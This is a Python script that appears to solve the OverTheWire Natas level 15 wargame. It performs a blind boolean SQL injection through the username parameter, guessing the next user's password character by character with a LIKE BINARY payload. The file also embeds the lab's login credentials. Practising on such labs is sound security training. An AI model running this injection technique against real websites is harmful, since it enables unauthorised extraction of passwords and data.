import requests

credentials = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
basic_url='http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16" AND password LIKE BINARY "'

def gen_al(start, end):
    return [chr(i) for i in range(ord(start), ord(end) + 1)]

alnum = gen_al('A', 'Z') + gen_al('a', 'z') + list(range(0,10))

def check(page) -> bool:
    return not page.text.split('<br>')[1] == "This user doesn't exist."

flag = str()
while len(flag) < 32:
    for new_symbol in alnum:
        url = f'{basic_url}{flag}{new_symbol}%'
        if check(requests.get(url, auth=credentials)):
            flag = flag + str(new_symbol)
            print(flag)
print('Done')